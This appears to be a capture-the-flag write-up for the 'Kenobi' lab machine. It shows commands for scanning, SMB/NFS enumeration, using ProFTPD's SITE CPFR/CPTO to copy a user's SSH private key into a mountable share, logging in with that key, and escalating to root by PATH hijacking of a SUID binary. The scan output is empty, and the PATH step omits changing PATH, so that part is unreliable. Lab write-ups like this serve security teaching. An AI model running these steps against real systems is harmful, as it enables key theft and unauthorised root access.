## Reconnaissance
As always we do, let’s start with nmap scan to the target.

```
sudo nmap -sC -sV -oA nmap/kenobi-open-ports -vv 10.10.5.29
```
Results: 
```

# Nmap done at Mon Jan  4 05:00:45 2021 -- 1 IP address (1 host up) scanned in 18.22 seconds
```

According to nmap scan output, the target has 7 open ports.

* ProFTPD 1.3.5 is running on port 21.
* OpenSSH 7.2 is running on port 22.
* Apache 2.4.18 is running on port 80 and also there is a file called admin.html which is accessible.
* 139 and 445 Samba for share default ports
* NFS (Network File System) service is running on 2049.
Let’s enumerate one by one. First of all, we have ProFTPD service which is using for file transfer, the version is 1.3.5. There is a few method that we can do. We can check that is there any anonymous login or does the version of ProFTPD has vulnerability. I tried anonymous login but it failed.

> `searchsploit ProFTPd 1.3.5`

After a quick `searchsploit` command, we can see that there are 3 vulnerabilities that `ProFTPD 1.3.5` is affected. We’ll use one of them which has been published with [CVE-2015-3306](https://www.exploit-db.com/exploits/36742) code in exploit-db. Unfortunately, we don’t know how to use this vulnerability. Let’s move on with Apache.

When we visit the web page via 80 port, we see that there are only 2 pages which are html and `nothing` useful.

Next one is `RPC` service. When an RPC service is started, it tells rpcbind the address at which it is listening and the `RPC program` number its prepared to serve.

> `nmap -p 111 –script=nfs-ls,nfs-statfs,nfs-showmount 10.10.5.29`

As a result, we can see `/var` folder that is mountable.

## Exploitation
Let’s jump into SMB. For SMB enumeration we can use smbclient tool. With the command given below, we can see share folders.

```
smbclient -L \\10.10.5.29
```
```
smbclient \\10.10.5.29\anonymous -U ‘’
```

Listing share folders:

As you see above the picture, we have a file called log.txt. You can see the contents of the file below.
```
Generating public/private rsa key pair.

Enter same passphrase again:

The key fingerprint is:
SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi
The key's randomart image is:

# This is a basic ProFTPD configuration file (rename it to 
# 'proftpd.conf' for actual use.  It establishes a single server
# and a single anonymous login.  It assumes that you have a user/group
# "nobody" and "ftp" for normal operation and anon.

ServerName			"ProFTPD Default Installation"
ServerType			standalone
DefaultServer			on

# Port 21 is the standard FTP port.
Port				21
```

We can see that the user-generated id_rsa file exists in Kenobi’s home directory. Let’s put the pieces together. We have vulnerable ProFTPd service, /var folder that we can mount and id_rsa file we can reach. If we copy rsa file to under /var folder, when we mount the folder we able to read rsa file and get access to the target. Firts, we need to copy rsa file to /var directory. We can do it via nc connection by connecting 21 port.

```
nc 10.10.5.29 21
```
```
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

After copying the file, let’s mount the var directory.

```
sudo mkdir /mnt/kenobi
sudo mount 10.10.5.29:/var /mnt/kenobi
sudo cp /mnt/kenobi/tmp/id_rsa .
```

Now, we can read id_rsa file and get access to target system.

```
chmod 600 id_rsa
ssh -i id_rsa kenobi@10.10.5.29
```

## Privilege Escalation
We’re inside. Now we have to gain root privileges. I checked that is there any sudo rights that defined to me on the system but there’s nothing. The next step will be to check whether any suid binaries can be manipulated in the prompt.

```
find / -perm -u=s -type f 2>/dev/null
```
[2022-12-16_19-30](https://user-images.githubusercontent.com/87711310/208114675-a1f513f1-f6c1-4848-ad09-d67630b8ca52.png)

As seen in the picture, there is a suid binary named menu. It’s a specially written program

![2022-12-16_19-30_1](https://user-images.githubusercontent.com/87711310/208114770-1f3a8909-7c8a-452e-8a10-0d20c5021e3c.png)

When we run the program, see that there is a few system options like ifconfig, kernel version. The binary is belong to root user and root group.

```
strings /usr/bin/menu
```
![2022-12-16_19-30_2](https://user-images.githubusercontent.com/87711310/208114983-282d5b62-832b-4336-ab3f-20e47b1b87d0.png)

If we check human readable strings that belong to menu binary via strings command, see that there are 3 system command. If we manipulate the binary we can gain root privileges. To do this we’ll use path variable manipulation method. With this method, we can run system programs by changing our path variable and running the code pieces we have written as a system program.

```
echo $PATH
mkdir bin
cd bin
echo "/bin/bash" > ifconfig
chmod +x ifconfig
/usr/bin/menu 
```

When we follow the steps, we’ll be gained root access.
